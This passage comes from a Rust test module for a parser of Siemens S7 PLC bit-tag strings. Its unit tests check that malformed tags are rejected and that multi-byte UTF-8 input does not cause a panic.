        assert!(parse_s7_bit_tag("1.3").is_none());
    }

    #[test]
    fn parse_s7_bit_tag_non_numeric_byte_returns_none() {
        assert!(parse_s7_bit_tag("Qx.3").is_none());
    }

    #[test]
    fn parse_s7_bit_tag_multibyte_utf8_does_not_panic() {
        // Regression: &tag[1..] panicked on multi-byte UTF-8 first chars (e.g. 'é' = 2 bytes).
        // Fix: use &tag[area.len_utf8()..] to skip the correct byte length.
        // The function only parses format, not area validity — callers validate the area char.
        // This test verifies no panic occurs; the exact return value is not significant.
        let _ = parse_s7_bit_tag("é0.5"); // must not panic
        let _ = parse_s7_bit_tag("中1.2"); // 3-byte UTF-8 char
    }
}
